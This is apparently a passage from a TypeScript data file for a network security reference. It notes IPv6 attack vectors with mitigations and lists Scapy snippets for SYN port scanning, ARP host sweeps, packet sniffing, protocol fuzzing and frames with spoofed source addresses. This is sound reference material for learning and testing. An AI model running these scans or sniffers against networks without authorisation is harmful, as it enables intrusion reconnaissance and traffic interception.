    notes: 'Same impact as IPv4 ARP poisoning. Mitigation: Dynamic IPv6 Inspection (DI6) on managed switches, RA Guard.',
  },
  {
    category: 'Attack vectors',
    topic: 'IPv6 in IPv4 networks',
    description: 'IPv6 is enabled by default on Windows, Linux, and macOS. Unmonitored IPv6 = blind spot in network security.',
    examples: ['Dual-stack: both IPv4 and IPv6 active simultaneously', 'Teredo: IPv6-over-UDP tunnel (port 3544) for NAT traversal', 'ISATAP: IPv6-over-IPv4 intranet tunneling', 'If attacker controls IPv6 but firewall only monitors IPv4: traffic bypasses controls'],
    notes: 'Many orgs have IPv6 enabled on hosts but no IPv6 firewall rules or monitoring. Attacker with IPv6 connectivity can bypass IPv4-only security controls. Check: ip -6 addr show — if non-link-local addresses present and network has no IPv6 policy, it\'s a gap.',
  },
]

// ─── Scapy / Packet Crafting ─────────────────────────────────────────────────

export interface ScapyExample {
  category: string
  description: string
  code: string
  notes?: string
}

export const scapyExamples: ScapyExample[] = [
  // Basics
  { category: 'Basics', description: 'Import and explore layers', code: `from scapy.all import *

# List available protocols
ls()             # all protocols
ls(IP)           # IP layer fields
ls(TCP)          # TCP layer fields
lsc()            # available functions` },
  { category: 'Basics', description: 'Build a simple packet', code: `pkt = IP(dst="192.168.1.1") / TCP(dport=80, flags="S")

pkt.show()       # display all fields
pkt.summary()    # one-line summary
hexdump(pkt)     # hex dump
pkt[TCP].flags   # access specific layer field` },
  // Send & receive
  { category: 'Send & receive', description: 'Send packets', code: `send(pkt)                    # L3 send (raw socket, no reply handling)
sendp(pkt, iface="eth0")    # L2 send with specific interface
send(pkt, count=5)          # send 5 times
send(pkt, inter=0.5)        # 0.5s between packets` },
  { category: 'Send & receive', description: 'Send and receive (sr)', code: `# sr = send/receive L3, srp = L2
ans, unans = sr(pkt, timeout=2)
ans.show()       # show answered packets
ans[0]           # first response: (sent, received) tuple

# sr1 = send and get first response
reply = sr1(IP(dst="8.8.8.8") / ICMP(), timeout=2)
reply.show()` },
  // Common packets
  { category: 'Common packets', description: 'ICMP ping', code: `ping = IP(dst="192.168.1.1") / ICMP()
reply = sr1(ping, timeout=2)
if reply:
    print(f"Host up: {reply.src}")` },
  { category: 'Common packets', description: 'TCP SYN scan', code: `target = "192.168.1.1"
ports = [22, 80, 443, 3389]

for port in ports:
    pkt = IP(dst=target) / TCP(dport=port, flags="S")
    reply = sr1(pkt, timeout=1, verbose=0)
    if reply and reply.haslayer(TCP):
        if reply[TCP].flags == "SA":
            print(f"Port {port}: OPEN")
        elif reply[TCP].flags == "RA":
            print(f"Port {port}: CLOSED")` },
  { category: 'Common packets', description: 'ARP request', code: `# Who has 192.168.1.1?
arp = ARP(pdst="192.168.1.1")
eth = Ether(dst="ff:ff:ff:ff:ff:ff")
pkt = eth / arp
ans, _ = srp(pkt, timeout=2, iface="eth0")
for sent, recv in ans:
    print(f"{recv.psrc} is at {recv.hwsrc}")` },
  { category: 'Common packets', description: 'ARP sweep (host discovery)', code: `from scapy.all import *

def arp_sweep(network):
    arp = ARP(pdst=network)
    eth = Ether(dst="ff:ff:ff:ff:ff:ff")
    pkt = eth / arp
    ans, _ = srp(pkt, timeout=2, iface="eth0", verbose=0)
    return [(r.psrc, r.hwsrc) for _, r in ans]

hosts = arp_sweep("192.168.1.0/24")
for ip, mac in hosts:
    print(f"{ip:20s} {mac}")` },
  { category: 'Common packets', description: 'DNS query', code: `dns_req = IP(dst="8.8.8.8") / UDP(dport=53) / \\
          DNS(rd=1, qd=DNSQR(qname="example.com", qtype="A"))

reply = sr1(dns_req, timeout=2)
if reply and reply.haslayer(DNS):
    print(reply[DNS].an.rdata)   # IP address answer` },
  { category: 'Common packets', description: 'TCP three-way handshake (manual)', code: `import random
dst_ip = "192.168.1.100"
dst_port = 80
seq = random.randint(1000, 65535)

# SYN
syn = IP(dst=dst_ip) / TCP(dport=dst_port, flags="S", seq=seq)
syn_ack = sr1(syn)

# ACK
ack = IP(dst=dst_ip) / TCP(dport=dst_port, flags="A",
         seq=syn_ack.ack, ack=syn_ack.seq + 1)
send(ack)

# RST to close
rst = IP(dst=dst_ip) / TCP(dport=dst_port, flags="R",
         seq=syn_ack.ack)
send(rst)` },
  // Sniffing
  { category: 'Sniffing', description: 'Capture packets', code: `# Capture 10 packets
pkts = sniff(count=10)
pkts.summary()

# Capture with filter (BPF syntax)
pkts = sniff(filter="tcp port 80", count=20, iface="eth0")

# Capture with callback
def packet_handler(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
        print(f"DNS query: {pkt[DNS].qd.qname}")

sniff(filter="udp port 53", prn=packet_handler, store=0)` },
  { category: 'Sniffing', description: 'Read / write pcap', code: `pkts = rdpcap("capture.pcap")  # read
wrpcap("output.pcap", pkts)   # write

# Filter from pcap
http = [p for p in pkts if p.haslayer(TCP) and p[TCP].dport == 80]

# Save filtered
wrpcap("http_only.pcap", http)` },
  // Fuzzing
  { category: 'Fuzzing', description: 'Fuzz a protocol field', code: `# Send TCP packets with random sequence numbers
for i in range(100):
    fuzz_pkt = IP(dst="192.168.1.1") / fuzz(TCP(dport=80))
    send(fuzz_pkt, verbose=0)

# fuzz() randomizes fields not explicitly set` },
  { category: 'Fuzzing', description: 'Layer 2 Ethernet frame', code: `# Craft raw Ethernet frame
eth_pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src="aa:bb:cc:dd:ee:ff", type=0x0800) / \\
          IP(dst="192.168.1.1", src="1.2.3.4") / \\
          ICMP()
sendp(eth_pkt, iface="eth0")` },
]
